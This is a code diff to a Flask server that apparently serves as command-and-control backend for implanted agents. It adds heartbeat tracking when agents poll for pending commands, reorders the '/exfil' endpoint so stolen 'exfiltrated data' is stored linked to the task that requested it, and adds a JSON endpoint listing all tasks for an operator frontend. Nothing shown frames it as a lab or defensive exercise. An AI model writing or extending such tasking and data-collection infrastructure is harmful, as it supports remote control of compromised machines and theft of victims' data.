@@ -549,9 +549,13 @@ def get_commands():
     conn = get_db_connection()
     c = conn.cursor()
     
+    # Update agent heartbeat
+    c.execute("""UPDATE agents SET last_seen = datetime('now'), status = 'online'
+                 WHERE agent_id = ?""", (agent_id,))
+
     # Only get tasks that are in 'pending' status
-    c.execute("""SELECT * FROM tasks 
-                 WHERE agent_id = ? 
+    c.execute("""SELECT * FROM tasks
+                 WHERE agent_id = ?
                  AND status = 'pending'""", (agent_id,))
     tasks = c.fetchall()
 
@@ -591,30 +595,31 @@ def exfil():
     c = conn.cursor()
     
     try:
-        # Store the exfiltrated data
-        c.execute("""
-            INSERT INTO data_records (agent_id, data_type, payload)
-            VALUES (?, ?, ?)
-        """, (agent_id, action, json.dumps(payload)))
-
-        # Find latest matching task
+        # Find latest matching task first so we can link it
         c.execute("""
             SELECT task_id FROM tasks
             WHERE agent_id = ?
             AND command = ?
             AND status IN ('pending', 'in_progress')
-            ORDER BY task_id DESC 
+            ORDER BY task_id DESC
             LIMIT 1
         """, (agent_id, action))
-                
+
         row = c.fetchone()
-        if row:
-            task_id = row['task_id']
+        linked_task_id = row['task_id'] if row else None
+
+        # Store the exfiltrated data linked to the task
+        c.execute("""
+            INSERT INTO data_records (agent_id, data_type, payload, task_id)
+            VALUES (?, ?, ?, ?)
+        """, (agent_id, action, json.dumps(payload), linked_task_id))
+
+        if linked_task_id:
             c.execute("""
                 UPDATE tasks
                 SET status = 'completed'
                 WHERE task_id = ?
-            """, (task_id,))
+            """, (linked_task_id,))
 
         conn.commit()
         return jsonify({'status': 'success'})
@@ -623,6 +628,17 @@ def exfil():
         return jsonify({'status': 'error', 'message': str(e)})
     finally:
         conn.close()
+
+@app.route('/api/tasks', methods=['GET'])
+def get_tasks_json():
+    """Return all tasks as JSON for frontend polling."""
+    conn = get_db_connection()
+    c = conn.cursor()
+    c.execute("SELECT * FROM tasks ORDER BY task_id DESC")
+    rows = c.fetchall()
+    conn.close()
+    tasks = [dict(r) for r in rows]
+    return jsonify(tasks)
 
 @app.route('/api/tasks/delete/<int:task_id>', methods=['POST'])
 def delete_task(task_id):
